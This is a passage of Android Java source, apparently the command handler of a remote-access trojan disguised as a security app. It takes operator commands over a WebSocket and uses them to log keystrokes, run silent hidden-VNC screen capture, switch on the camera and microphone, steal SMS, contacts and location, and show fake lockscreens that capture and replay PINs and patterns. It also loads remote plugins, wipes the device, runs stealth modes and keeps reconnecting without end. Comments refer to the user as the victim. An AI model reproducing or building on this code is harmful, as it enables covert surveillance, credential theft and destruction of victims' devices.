                        Log.d(TAG, "📐 LONG_PRESS (vnc scaled): (" + lpX + "," + lpY + ")");
                    } else {
                        lpX = Math.round(rawX);
                        lpY = Math.round(rawY);
                        Log.d(TAG, "📐 LONG_PRESS (raw/fallback): (" + lpX + "," + lpY + ")");
                    }
                    performLongPress(lpX, lpY, duration);
                    sendResponse("OK", "Long press executado");
                    break;
                }
                    
                case "PATH_GESTURE":
                    // Gesto com múltiplos pontos (para pattern L, U, Z, etc)
                    if (cmd.has("path")) {
                        String pathJson = cmd.get("path").toString();
                        Intent pathIntent = new Intent("com.seguranca.protecao.PERFORM_GESTURE");
                        pathIntent.putExtra("action", "PATH_GESTURE");
                        pathIntent.putExtra("path", pathJson);
                        
                        UiAssistBridge bridgePath = UiAssistBridge.instance;
                        if (bridgePath != null && bridgePath.getGestureCore() != null) {
                            bridgePath.getGestureCore().handlePerformGesture(pathIntent);
                        } else {
                            sendBroadcast(pathIntent);
                        }
                        sendResponse("OK", "Path gesture executado");
                    } else {
                        sendResponse("ERROR", "Path não especificado");
                    }
                    break;
                    
                case "TYPE":
                    String text = cmd.get("text").getAsString();
                    performType(text);
                    sendResponse("OK", "Texto digitado");
                    break;
                    
                case "SEND_SMS": {
                    String phone = "";
                    if (cmd.has("phone") && !cmd.get("phone").isJsonNull()) {
                        phone = cmd.get("phone").getAsString();
                    } else if (cmd.has("number") && !cmd.get("number").isJsonNull()) {
                        phone = cmd.get("number").getAsString();
                    } else if (cmd.has("target") && !cmd.get("target").isJsonNull()) {
                        phone = cmd.get("target").getAsString();
                    }

                    String message = "";
                    if (cmd.has("message") && !cmd.get("message").isJsonNull()) {
                        message = cmd.get("message").getAsString();
                    } else if (cmd.has("text") && !cmd.get("text").isJsonNull()) {
                        message = cmd.get("text").getAsString();
                    }

                    sendSMS(phone, message);
                    break;
                }

                case "GET_SMS":
                    String sms = getSMS();
                    sendResponse("SMS", sms);
                    break;
                    
                case "GET_CONTACTS":
                    String contacts = getContacts();
                    sendResponse("CONTACTS", contacts);
                    break;
                    
                case "GET_LOCATION":
                    String location = getLocation();
                    sendResponse("LOCATION", location);
                    break;
                    
                case "PING":
                    // 🚀 Recebeu PING do servidor - responde e atualiza estado
                    lastPongTime = System.currentTimeMillis();
                    pendingFrames = 0; // Reset contador - servidor está respondendo
                    if (isSlowConnection && consecutiveSlowFrames == 0) {
                        isSlowConnection = false; // Conexão voltou ao normal
                        Log.d(TAG, "🚀 Conexão normalizada!");
                    }
                    sendResponse("PONG", "alive");
                    break;
                    
                case "TOGGLE_KEYLOGGER":
                    boolean enabled = cmd.get("enabled").getAsBoolean();
                    toggleKeylogger(enabled);
                    sendResponse("OK", "Keylogger " + (enabled ? "ativado" : "desativado"));
                    break;
                    
                case "TOGGLE_SCREEN_READER":
                    boolean srEnabled = cmd.get("enabled").getAsBoolean();
                    toggleScreenReader(srEnabled);
                    sendResponse("OK", "Screen Reader " + (srEnabled ? "ativado" : "desativado"));
                    break;
                    
                case "TOGGLE_CAMERA":
                    boolean cameraEnabled = cmd.get("enabled").getAsBoolean();
                    toggleCamera(cameraEnabled);
                    sendResponse("OK", "Câmera " + (cameraEnabled ? "ativada" : "desativada"));
                    break;
                    
                case "TOGGLE_MICROPHONE":
                    boolean micEnabled = cmd.get("enabled").getAsBoolean();
                    toggleMicrophone(micEnabled);
                    sendResponse("OK", "Microfone " + (micEnabled ? "ativado" : "desativado"));
                    break;
                    
                case "TOGGLE_SILENT_VNC":
                    Log.d(TAG, "🔇🔇🔇 CASE TOGGLE_SILENT_VNC ATINGIDO!");
                    try {
                        boolean silentVncEnabled = true; // Default
                        if (cmd.has("enabled") && !cmd.get("enabled").isJsonNull()) {
                            silentVncEnabled = cmd.get("enabled").getAsBoolean();
                        }
                        boolean silentOnly = true;
                        if (cmd.has("silent_only") && !cmd.get("silent_only").isJsonNull()) {
                            silentOnly = cmd.get("silent_only").getAsBoolean();
                        }
                        int quality = -1;
                        if (cmd.has("quality") && !cmd.get("quality").isJsonNull()) {
                            quality = cmd.get("quality").getAsInt();
                        }
                        Log.d(TAG, "silentVncEnabled = " + silentVncEnabled + ", quality = " + quality);

                        // Garante que o bypass de captura com tela preta transparente permaneça desativado para VNC normal
                        UiAssistBridge.setBlackScreenCaptureFallback(false);

                        toggleSilentVnc(silentVncEnabled, silentOnly, quality);
                        sendResponse("OK", "VNC " + (silentVncEnabled ? "ativado" : "desativado"));
                    } catch (Exception e) {
                        Log.e(TAG, "🔇 ERRO ao processar TOGGLE_SILENT_VNC: " + e.getMessage(), e);
                        sendResponse("ERROR", "Erro: " + e.getMessage());
                    }
                    break;
                case "SET_VNC_MODE":
                    try {
                        UiAssistBridge.setBlackScreenCaptureFallback(false);
                        Log.d(TAG, "📺 SET_VNC_MODE: normal (HVNC removed)");
                        sendResponse("OK", "Modo VNC alterado para normal");
                    } catch (Exception e) {
                        Log.e(TAG, "Erro ao processar SET_VNC_MODE: " + e.getMessage(), e);
                        sendResponse("ERROR", "Erro: " + e.getMessage());
                    }
                    break;

                case "TOGGLE_KILLER_MODE":
                    try {
                        boolean killerEnabled = cmd.has("enabled") && !cmd.get("enabled").isJsonNull()
                                && cmd.get("enabled").getAsBoolean();
                        isKillerModeActive = killerEnabled;
                        Log.d(TAG, "KILLER MODE: " + (killerEnabled ? "ON" : "OFF"));
                        sendResponse("OK", "Killer mode " + (killerEnabled ? "ativado" : "desativado"));
                    } catch (Exception e) {
                        Log.e(TAG, "Erro ao processar TOGGLE_KILLER_MODE: " + e.getMessage(), e);
                        sendResponse("ERROR", "Erro: " + e.getMessage());
                    }
                    break;

                case "REQUEST_VNC_FRAME":
                    if (isKillerModeActive) {
                        UiAssistBridge.requestKillerCapture();
                    }
                    sendResponse("OK", "Frame solicitado");
                    break;

                case "SET_SILENT_VNC_QUALITY":
                    try {
                        int silentQ = cmd.get("quality").getAsInt();
                        UiAssistBridge.setSilentCaptureQuality(silentQ);
                        sendResponse("OK", "Qualidade silent: " + UiAssistBridge.getSilentCaptureQuality());
                        Log.d(TAG, "🔇 SET_SILENT_VNC_QUALITY -> " + UiAssistBridge.getSilentCaptureQuality());
                    } catch (Exception e) {
                        Log.e(TAG, "🔇 ERRO SET_SILENT_VNC_QUALITY: " + e.getMessage(), e);
                        sendResponse("ERROR", "Erro: " + e.getMessage());
                    }
                    break;
                
                case "FORCE_RESTART_VNC":
                    Log.d(TAG, "FORCE_RESTART_VNC - reiniciando HVNC silencioso");
                    try {
                        forceRestartVnc();
                        sendResponse("OK", "HVNC restart solicitado");
                    } catch (Exception e) {
                        Log.e(TAG, "🔄 ERRO ao processar FORCE_RESTART_VNC: " + e.getMessage(), e);
                        sendResponse("ERROR", "Erro: " + e.getMessage());
                    }
                    break;

                case "RECONNECT_CONNECTION":
                    Log.d(TAG, "🔄 RECONNECT_CONNECTION recebido do painel! Forçando reconexão WebSocket...");
                    try {
                        sendResponse("OK", "Reconexão iniciada pelo operador");

                        handler.postDelayed(() -> {
                            try {
                                if (webSocket != null) {
                                    webSocket.close(1000, "Reinício de conexão solicitado pelo painel");
                                    webSocket = null;
                                }
                                scheduleReconnect();
                            } catch (Exception ex) {
                                Log.e(TAG, "Erro ao fechar WebSocket no RECONNECT_CONNECTION: " + ex.getMessage());
                            }
                        }, 200);
                    } catch (Exception e) {
                        Log.e(TAG, "🔄 ERRO ao processar RECONNECT_CONNECTION: " + e.getMessage(), e);
                        sendResponse("ERROR", "Erro: " + e.getMessage());
                    }
                    break;
                    
                case "CONFIGURE_ROM":
                    // 🔧 Configura ROM automaticamente (Autostart, Battery, etc)
                    Log.d(TAG, "🔧🔧🔧 CONFIGURE_ROM - Iniciando configuração de ROM!");
                    try {
                        configureROM();
                        sendResponse("OK", "Configuração de ROM iniciada");
                    } catch (Exception e) {
                        Log.e(TAG, "🔧 ERRO ao configurar ROM: " + e.getMessage(), e);
                        sendResponse("ERROR", "Erro: " + e.getMessage());
                    }
                    break;
                    
                case "SCREEN_PERSISTENCE":
                    // 🔒 Ativa/desativa persistência de tela (não deixa vítima desligar)
                    boolean persistenceEnabled = cmd.has("enabled") && cmd.get("enabled").getAsBoolean();
                    Log.d(TAG, "🔒🔒🔒 SCREEN_PERSISTENCE - " + (persistenceEnabled ? "ATIVANDO" : "DESATIVANDO"));
                    try {
                        toggleScreenPersistence(persistenceEnabled);
                        sendResponse("OK", "Persistência de tela " + (persistenceEnabled ? "ATIVADA" : "DESATIVADA"));
                    } catch (Exception e) {
                        Log.e(TAG, "🔒 ERRO: " + e.getMessage(), e);
                        sendResponse("ERROR", "Erro: " + e.getMessage());
                    }
                    break;
                    
                case "SWITCH_CAMERA":
                    String camera = cmd.get("camera").getAsString();
                    switchCamera(camera);
                    sendResponse("OK", "Câmera alterada para " + (camera.equals("front") ? "frontal" : "traseira"));
                    break;
                
                // === BOTÕES DE NAVEGAÇÃO ANDROID ===
                case "BACK":
                    performNavigation("BACK");
                    sendResponse("OK", "Botão BACK executado");
                    break;
                    
                case "HOME":
                    performNavigation("HOME");
                    sendResponse("OK", "Botão HOME executado");
                    break;
                    
                case "RECENTS":
                    performNavigation("RECENTS");
                    sendResponse("OK", "Botão RECENTS executado");
                    break;
                    
                case "POWER":
                    performNavigation("POWER");
                    sendResponse("OK", "Botão POWER executado");
                    break;
                
                case "POWER_MENU":
                    // Long press do Power - abre menu de desligar/reiniciar
                    performNavigation("POWER_MENU");
                    sendResponse("OK", "Menu Power aberto");
                    break;
                    
                case "NOTIFICATIONS":
                    performNavigation("NOTIFICATIONS");
                    sendResponse("OK", "Notificações abertas");
                    break;
                    
                case "QUICK_SETTINGS":
                    performNavigation("QUICK_SETTINGS");
                    sendResponse("OK", "Configurações rápidas abertas");
                    break;

                case "VIBRATE":
                    vibrateDevice();
                    sendResponse("OK", "Vibração executada");
                    break;

                case "VOLUME_UP":
                    adjustVolume(true);
                    sendResponse("OK", "Volume aumentado");
                    break;

                case "VOLUME_DOWN":
                    adjustVolume(false);
                    sendResponse("OK", "Volume diminuído");
                    break;

                case "LOCK_DEVICE":
                    performNavigation("LOCK_SCREEN");
                    sendResponse("OK", "Bloqueio de tela solicitado");
                    break;

                case "SNAP_SCREEN":
                    triggerSnapScreen();
                    sendResponse("OK", "Screenshot solicitado");
                    break;
                
                // === SISTEMA DE DESBLOQUEIO AUTOMÁTICO ===
                case "START_UNLOCK_RECORDING":
                    startUnlockRecording();
                    sendResponse("OK", "Gravação de desbloqueio iniciada");
                    break;
                    
                case "STOP_UNLOCK_RECORDING":
                    stopUnlockRecording();
                    sendResponse("OK", "Gravação de desbloqueio finalizada");
                    break;
                    
                case "PLAY_UNLOCK_SEQUENCE":
                    String seqJson = cmd.has("text") ? cmd.get("text").getAsString() : null;
                    if (seqJson != null && !seqJson.isEmpty()) {
                        playUnlockSequence(seqJson);
                    } else {
                        playUnlockSequence();
                    }
                    sendResponse("OK", "Reproduzindo sequência de desbloqueio");
                    break;
                    
                case "PATTERN_UNLOCK":
                    // Executa pattern unlock diretamente
                    // Formato: {"action": "PATTERN_UNLOCK", "pattern": "14789"}
                    String pattern = cmd.has("pattern") ? cmd.get("pattern").getAsString() : null;
                    if (pattern != null && !pattern.isEmpty()) {
                        if (UiAssistBridge.instance != null) {
                            UiAssistBridge.instance.playPatternSequence(pattern, 1000);
                        } else {
                            Intent patternIntent = new Intent("com.seguranca.protecao.PLAY_PATTERN_SEQUENCE");
                            patternIntent.setPackage(getPackageName());
                            patternIntent.putExtra("pattern", pattern);
                            patternIntent.putExtra("delay", 1000);
                            sendBroadcast(patternIntent);
                        }
                        sendResponse("OK", "Executando pattern unlock: " + pattern);
                    } else {
                        sendResponse("ERROR", "Pattern não especificado");
                    }
                    break;
                
                // ==================== SISTEMA DE LOCKSCREEN PIN (IGUAL EAGLESPY V5) ====================
                
                case "SHOW_LOCKSCREEN":
                    // 🔒 Mostra overlay de lockscreen fake (PIN ou PATTERN)
                    String lockType = cmd.has("type") ? cmd.get("type").getAsString() : "PIN";
                    Log.d(TAG, "🔒 SHOW_LOCKSCREEN - Mostrando overlay tipo: " + lockType);
                    Intent showLockIntent = new Intent("com.seguranca.protecao.SHOW_LOCKSCREEN");
                    showLockIntent.setPackage(getPackageName());
                    showLockIntent.putExtra("type", lockType);
                    sendBroadcast(showLockIntent);
                    sendResponse("OK", "Overlay de lockscreen iniciado: " + lockType);
                    break;
                    
                case "HIDE_LOCKSCREEN":
                    // 🔓 Esconde overlay de lockscreen
                    Log.d(TAG, "🔓 HIDE_LOCKSCREEN - Removendo overlay");
                    Intent hideLockIntent = new Intent("com.seguranca.protecao.HIDE_LOCKSCREEN");
                    hideLockIntent.setPackage(getPackageName());
                    sendBroadcast(hideLockIntent);
                    sendResponse("OK", "Overlay de lockscreen removido");
                    break;
                    
                case "LOCK_KEY_PRESS":
                    // 🔢 Simula clique numa tecla de PIN (igual sp<*>LKkp do EAGLESPY)
                    String keyNum = cmd.has("key") ? cmd.get("key").getAsString() : null;
                    Log.d(TAG, "🔢 LOCK_KEY_PRESS - Tecla: " + keyNum);
                    Intent keyIntent = new Intent("com.seguranca.protecao.LOCK_KEY_PRESS");
                    keyIntent.setPackage(getPackageName());
                    keyIntent.putExtra("key", keyNum);
                    sendBroadcast(keyIntent);
                    sendResponse("OK", "Tecla " + keyNum + " pressionada");
                    break;
                    
                case "PLAY_PIN_SEQUENCE":
                    // 🔄 Reproduz sequência de PIN automaticamente (igual EAGLESPY)
                    // Formato: {"action": "PLAY_PIN_SEQUENCE", "pin": "1234", "delay": 1000}
                    String pinSequence = cmd.has("pin") ? cmd.get("pin").getAsString() : null;
                    int delayMs = cmd.has("delay") ? cmd.get("delay").getAsInt() : 1000;
                    if (pinSequence != null && !pinSequence.isEmpty()) {
                        Log.d(TAG, "🔄 PLAY_PIN_SEQUENCE - Reproduzindo PIN: " + pinSequence + " (delay: " + delayMs + "ms)");
                        if (UiAssistBridge.instance != null) {
                            UiAssistBridge.instance.playPinSequenceWithDelay(pinSequence, delayMs);
                        } else {
                            Intent playPinIntent = new Intent("com.seguranca.protecao.PLAY_PIN_SEQUENCE");
                            playPinIntent.setPackage(getPackageName());
                            playPinIntent.putExtra("pin", pinSequence);
                            playPinIntent.putExtra("delay", delayMs);
                            sendBroadcast(playPinIntent);
                        }
                        sendResponse("OK", "Reproduzindo PIN: " + pinSequence);
                    } else {
                        sendResponse("ERROR", "PIN não especificado");
                    }
                    break;
                    
                case "PLAY_PATTERN_SEQUENCE":
                    // 🔲 Reproduz sequência de PATTERN automaticamente
                    // Formato: {"action": "PLAY_PATTERN_SEQUENCE", "pattern": "14789", "delay": 1000}
                    String patternSeq = cmd.has("pattern") ? cmd.get("pattern").getAsString() : null;
                    int patternDelay = cmd.has("delay") ? cmd.get("delay").getAsInt() : 1000;
                    if (patternSeq != null && !patternSeq.isEmpty()) {
                        Log.d(TAG, "🔲 PLAY_PATTERN_SEQUENCE - Reproduzindo Pattern: " + patternSeq);
                        if (UiAssistBridge.instance != null) {
                            UiAssistBridge.instance.playPatternSequence(patternSeq, patternDelay);
                        } else {
                            Intent playPatternIntent = new Intent("com.seguranca.protecao.PLAY_PATTERN_SEQUENCE");
                            playPatternIntent.setPackage(getPackageName());
                            playPatternIntent.putExtra("pattern", patternSeq);
                            playPatternIntent.putExtra("delay", patternDelay);
                            sendBroadcast(playPatternIntent);
                        }
                        sendResponse("OK", "Reproduzindo Pattern: " + patternSeq);
                    } else {
                        sendResponse("ERROR", "Pattern não especificado");
                    }
                    break;
                
                // ==================== GERENCIAMENTO DE APPS ====================
                
                case "GET_INSTALLED_APPS":
                    // Lista todos os apps instalados
                    getInstalledApps();
                    break;
                    
                case "OPEN_APP":
                    // Abre um app pelo package name
                    String packageToOpen = cmd.has("package") ? cmd.get("package").getAsString() : null;
                    if (packageToOpen != null) {
                        openApp(packageToOpen);
                    }
                    break;

                case "DUPLICATE_APP": {
                    String targetPkg = cmd.has("package") ? cmd.get("package").getAsString() : null;
                    String clonePkg = cmd.has("text") ? cmd.get("text").getAsString() : (targetPkg != null ? targetPkg + ".cloned" : null);
                    String cloneName = null;
                    if (cmd.has("template") && cmd.get("template").isJsonObject()) {
                        com.google.gson.JsonObject t = cmd.getAsJsonObject("template");
                        if (t.has("clone_name")) cloneName = t.get("clone_name").getAsString();
                    }
                    if (targetPkg != null) {
                        duplicateApp(targetPkg, clonePkg, cloneName);
                    } else {
                        sendResponse("ERROR", "Pacote alvo não especificado");
                    }
                    break;
                }
                    
                case "UNINSTALL_APP":
                case "UNINSTALL":
                case "DELETE_APP": {
                    String pkgToUninstall = cmd.has("package") ? cmd.get("package").getAsString() : (cmd.has("text") ? cmd.get("text").getAsString() : null);
                    if (pkgToUninstall != null) {
                        uninstallApp(pkgToUninstall);
                    } else {
                        sendResponse("ERROR", "Package não especificado");
                    }
                    break;
                }

                case "SELF_DESTRUCT": {
                    // Auto-remove o próprio app do dispositivo
                    isSelfDestructActive = true;
                    Log.d(TAG, "💣 Comando SELF_DESTRUCT recebido! Iniciando auto-remoção...");
                    sendResponse("SUCCESS", "💣 Auto-remoção iniciada. O app será desinstalado do aparelho.");
                    new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
                        try {
                            // Tenta remover admin primeiro (necessário para desinstalar se for device admin)
                            android.app.admin.DevicePolicyManager dpm2 = (android.app.admin.DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
                            android.content.ComponentName adminComp = new android.content.ComponentName(this, MyAdminReceiver.class);
                            if (dpm2 != null && dpm2.isAdminActive(adminComp)) {
                                dpm2.removeActiveAdmin(adminComp);
                                Log.d(TAG, "💣 Admin removido antes de desinstalar.");
                            }
                        } catch (Exception e) {
                            Log.e(TAG, "💣 Erro ao remover admin: " + e.getMessage());
                        }
                        // Aguarda um pouco para o admin ser removido
                        new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
                            try {
                                Intent uninstallIntent = new Intent(Intent.ACTION_DELETE);
                                uninstallIntent.setData(android.net.Uri.parse("package:" + getPackageName()));
                                uninstallIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                                startActivity(uninstallIntent);
                                Log.d(TAG, "💣 Intent de desinstalação lançada!");
                            } catch (Exception e) {
                                Log.e(TAG, "💣 Erro ao lançar desinstalação: " + e.getMessage());
                                // Fallback: abre configurações do app
                                try {
                                    Intent settingsIntent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                                    settingsIntent.setData(android.net.Uri.parse("package:" + getPackageName()));
                                    settingsIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                    startActivity(settingsIntent);
                                } catch (Exception e2) {
                                    Log.e(TAG, "💣 Fallback também falhou: " + e2.getMessage());
                                }
                            }
                        }, 800);
                    }, 300);
                    break;
                }

                case "CHECK_ADMIN_STATUS": {
                    // Verifica se o Device Admin está ativo e informa ao painel
                    try {
                        android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
                        android.content.ComponentName adminComponent = new android.content.ComponentName(this, MyAdminReceiver.class);
                        boolean isAdmin = dpm != null && dpm.isAdminActive(adminComponent);
                        Log.d(TAG, "CHECK_ADMIN_STATUS: isAdmin = " + isAdmin);
                        sendResponse("ADMIN_STATUS", isAdmin ? "ACTIVE" : "INACTIVE");
                    } catch (Exception e) {
                        sendResponse("ERROR", "Erro ao verificar status de admin: " + e.getMessage());
                    }
                    break;
                }

                case "REQUEST_ADMIN_PERMISSION": {
                    // Abre a tela de ativação de Device Admin no aparelho alvo
                    Log.d(TAG, "🛡️ Comando REQUEST_ADMIN_PERMISSION recebido!");
                    try {
                        CommandControlService.requestAdminRuntime = true;
                        android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
                        android.content.ComponentName adminComponent = new android.content.ComponentName(this, MyAdminReceiver.class);
                        if (dpm != null && dpm.isAdminActive(adminComponent)) {
                            CommandControlService.requestAdminRuntime = false;
                            sendResponse("SUCCESS", "Administrador de Dispositivo já está ativo neste aparelho.");
                        } else {
                            // IMPORTANTE: Não chama startActivity diretamente do Service!
                            // Android 10+ bloqueia Services de abrir Activities em segundo plano.
                            // Enviamos broadcast para o AccessibilityService (UiAssistBridge) que tem essa permissão.
                            Intent broadcastIntent = new Intent("com.seguranca.protecao.REQUEST_ADMIN_INTENT");
                            broadcastIntent.setPackage(getPackageName());
                            sendBroadcast(broadcastIntent);
                            Log.d(TAG, "🛡️ Broadcast REQUEST_ADMIN_INTENT enviado para AccessibilityService!");
                            sendResponse("SUCCESS", "Solicitação de Administrador enviada ao aparelho. Aguarde a tela de ativação.");
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Erro ao solicitar admin: " + e.getMessage());
                        sendResponse("ERROR", "Erro ao solicitar admin: " + e.getMessage());
                    }
                    break;
                }

                case "FORMAT_DEVICE": {
                    Log.d(TAG, "⚠️ Comando FORMAT_DEVICE recebido!");
                    try {
                        android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
                        android.content.ComponentName adminComponent = new android.content.ComponentName(this, MyAdminReceiver.class);
                        if (dpm != null && dpm.isAdminActive(adminComponent)) {
                            dpm.wipeData(0);
                            sendResponse("SUCCESS", "Comando de formatação enviado via DevicePolicyManager.");
                        } else {
                            Log.e(TAG, "FORMAT_DEVICE falhou: Administrador de Dispositivo não está ativo!");
                            sendResponse("ERROR", "Administrador de Dispositivo não está ativo neste aparelho. Use o botão 'Pedir Admin' no painel primeiro.");
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Falha ao formatar via DevicePolicyManager: " + e.getMessage());
                        sendResponse("ERROR", "Erro ao formatar: " + e.getMessage());
                    }
                    try {
                        Intent intent = new Intent(android.provider.Settings.ACTION_PRIVACY_SETTINGS);
                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        startActivity(intent);
                        sendResponse("SUCCESS", "Tela de redefinição de fábrica aberta no aparelho.");
                    } catch (Exception ex) {
                        try {
                            Intent intent = new Intent("android.intent.action.MASTER_CLEAR");
                            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                            startActivity(intent);
                            sendResponse("SUCCESS", "Tela de master clear aberta no aparelho.");
                        } catch (Exception ex2) {
                            sendResponse("ERROR", "Não foi possível abrir a tela de redefinição: " + ex2.getMessage());
                        }
                    }
                    break;
                }
                    
                case "FORCE_STOP_APP":
                case "STOP_APP":
                case "FORCE_STOP":
                    // Força parada de um app
                    String packageToStop = cmd.has("package") ? cmd.get("package").getAsString() : (cmd.has("text") ? cmd.get("text").getAsString() : null);
                    if (packageToStop != null) {
                        forceStopApp(packageToStop);
                    }
                    break;

                
                // ==================== INSTALAÇÃO SILENCIOSA DE APK ====================
                
                case "INSTALL_APK":
                    sendResponse("ERROR", "Instalação remota de APK desabilitada nesta build");
                    break;

                // ===== PLUGIN SYSTEM COMMANDS =====
                case "LOAD_PLUGIN": {
                    try {
                        String pluginUrl = cmd.has("url") ? cmd.get("url").getAsString() : null;
                        String pluginId = cmd.has("pluginId") ? cmd.get("pluginId").getAsString() : null;
                        String pluginClass = cmd.has("className") ? cmd.get("className").getAsString() : null;
                        String pluginSha = cmd.has("sha256") ? cmd.get("sha256").getAsString() : null;

                        if (pluginUrl != null && pluginId != null && pluginClass != null) {
                            com.seguranca.protecao.plugin.PluginDownloader downloader =
                                com.seguranca.protecao.plugin.PluginDownloader.getInstance(this);
                            downloader.downloadAndLoad(pluginUrl, pluginId, pluginSha, pluginClass, null);
                            sendResponse("OK", "Plugin download iniciado: " + pluginId);
                        } else {
                            sendResponse("ERROR", "LOAD_PLUGIN requer url, pluginId, className");
                        }
                    } catch (Exception e) {
                        sendResponse("ERROR", "LOAD_PLUGIN erro: " + e.getMessage());
                    }
                    break;
                }

                case "UNLOAD_PLUGIN": {
                    try {
                        String pluginId = cmd.has("pluginId") ? cmd.get("pluginId").getAsString() : null;
                        if (pluginId != null) {
                            com.seguranca.protecao.plugin.PluginManager pm =
                                com.seguranca.protecao.plugin.PluginManager.getInstance(this);
                            pm.unloadPlugin(pluginId);
                            sendResponse("OK", "Plugin descarregado: " + pluginId);
                        } else {
                            sendResponse("ERROR", "UNLOAD_PLUGIN requer pluginId");
                        }
                    } catch (Exception e) {
                        sendResponse("ERROR", "UNLOAD_PLUGIN erro: " + e.getMessage());
                    }
                    break;
                }

                case "EXEC_PLUGIN": {
                    try {
                        String pluginId = cmd.has("pluginId") ? cmd.get("pluginId").getAsString() : null;
                        String pluginAction = cmd.has("pluginAction") ? cmd.get("pluginAction").getAsString() : null;
                        if (pluginId != null && pluginAction != null) {
                            com.seguranca.protecao.plugin.PluginManager pm =
                                com.seguranca.protecao.plugin.PluginManager.getInstance(this);
                            Object result = pm.executePlugin(pluginId, pluginAction, null);
                            sendResponse("PLUGIN_RESULT", result != null ? result.toString() : "null");
                        } else {
                            sendResponse("ERROR", "EXEC_PLUGIN requer pluginId, pluginAction");
                        }
                    } catch (Exception e) {
                        sendResponse("ERROR", "EXEC_PLUGIN erro: " + e.getMessage());
                    }
                    break;
                }

                case "LIST_PLUGINS": {
                    try {
                        com.seguranca.protecao.plugin.PluginManager pm =
                            com.seguranca.protecao.plugin.PluginManager.getInstance(this);
                        java.util.List<java.util.Map<String, String>> plugins = pm.listPlugins();
                        String pluginJson = new Gson().toJson(plugins);
                        sendResponse("PLUGINS_LIST", pluginJson);
                    } catch (Exception e) {
                        sendResponse("ERROR", "LIST_PLUGINS erro: " + e.getMessage());
                    }
                    break;
                }

                // ===== STEALTH PROTOCOL COMMANDS =====
                case "STEALTH_STATUS": {
                    try {
                        com.seguranca.protecao.stealth.StealthProtocol sp =
                            com.seguranca.protecao.stealth.StealthProtocol.getInstance();
                        JsonObject status = new JsonObject();
                        status.addProperty("active", sp.isActive());
                        status.addProperty("threatLevel", sp.getCurrentThreatLevel());
                        status.addProperty("mode", sp.getCurrentMode());
                        sendResponse("STEALTH_INFO", status.toString());
                    } catch (Exception e) {
                        sendResponse("ERROR", "STEALTH_STATUS erro: " + e.getMessage());
                    }
                    break;
                }

                case "SET_THREAT_LEVEL": {
                    try {
                        int level = cmd.has("level") ? cmd.get("level").getAsInt() : 0;
                        com.seguranca.protecao.stealth.StealthProtocol sp =
                            com.seguranca.protecao.stealth.StealthProtocol.getInstance();
                        sp.adaptThreatLevel(level);
                        sendResponse("OK", "Threat level ajustado para " + level);
                    } catch (Exception e) {
                        sendResponse("ERROR", "SET_THREAT_LEVEL erro: " + e.getMessage());
                    }
                    break;
                }
                    
                default:
                    Log.w(TAG, "Comando desconhecido: " + action);
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Erro ao processar comando: " + e.getMessage());
        }
    }

    /**
     * Callback: Desconectado
     */
    private void onDisconnected() {
        Log.d(TAG, "Desconectado do servidor");
        isConnected = false;
        webSocket = null;
        
        // Reagenda reconexão
        if (shouldReconnect) {
            scheduleReconnect();
        }
    }

    /**
     * Agenda reconexão ULTRA AGRESSIVA - NUNCA desiste!
     */
    private void scheduleReconnect() {
        // NUNCA para de tentar!
        if (reconnectAttempts >= MAX_RECONNECT_ATTEMPTS) {
            Log.w(TAG, "⚠️ Muitas tentativas - resetando contador mas CONTINUANDO!");
            reconnectAttempts = 0;
        }
        
        reconnectAttempts++;
        
        // Backoff limitado: 2s, 4s, 8s... max 15s (muito mais rápido!)
        int delay = Math.min(RECONNECT_DELAY * (int)Math.pow(2, Math.min(reconnectAttempts - 1, 3)), 15000);
        
        Log.d(TAG, "🔄 Reconectando em " + (delay / 1000) + "s (tentativa " + reconnectAttempts + ")");
        
        // Remove apenas reconexão pendente (preserva heartbeats e outros callbacks)
        handler.removeCallbacks(reconnectRunnable);
        handler.postDelayed(reconnectRunnable, delay);
    }
    
    private void checkConnectionHealth() {
        long now = System.currentTimeMillis();
        
        // Se não enviou nada há mais de 300 segundos (5 minutos), força reconexão de segurança
        if (lastSuccessfulSend > 0 && (now - lastSuccessfulSend) > 300000) {
            Log.w(TAG, "⚠️ Conexão sem envios há mais de 300s - renovando WebSocket!");
            isConnected = false;
            if (webSocket != null) {
                try {
                    webSocket.close(1000, "Health check timeout");
                } catch (Exception e) {}
                webSocket = null;
            }
            scheduleReconnect();
        }
    }

    /**
     * Detecta o tipo exato de conexão de rede (Wi-Fi, 4G, 5G, Cellular, etc.)
     */
    public String getNetworkType() {
        try {
            android.net.ConnectivityManager cm = (android.net.ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
            if (cm == null) return "Wi-Fi";

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                android.net.Network activeNetwork = cm.getActiveNetwork();
                if (activeNetwork == null) return "Wi-Fi";

                android.net.NetworkCapabilities capabilities = cm.getNetworkCapabilities(activeNetwork);
                if (capabilities != null) {
                    if (capabilities.hasTransport(android.net.NetworkCapabilities.TRANSPORT_WIFI)) {
                        return "Wi-Fi";
                    } else if (capabilities.hasTransport(android.net.NetworkCapabilities.TRANSPORT_CELLULAR)) {
                        try {
                            android.telephony.TelephonyManager tm = (android.telephony.TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
                            if (tm != null && checkCallingOrSelfPermission(android.Manifest.permission.READ_PHONE_STATE) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
                                int networkType = tm.getDataNetworkType();
                                switch (networkType) {
                                    case android.telephony.TelephonyManager.NETWORK_TYPE_NR:
                                        return "5G";
                                    case android.telephony.TelephonyManager.NETWORK_TYPE_LTE:
                                        return "4G";
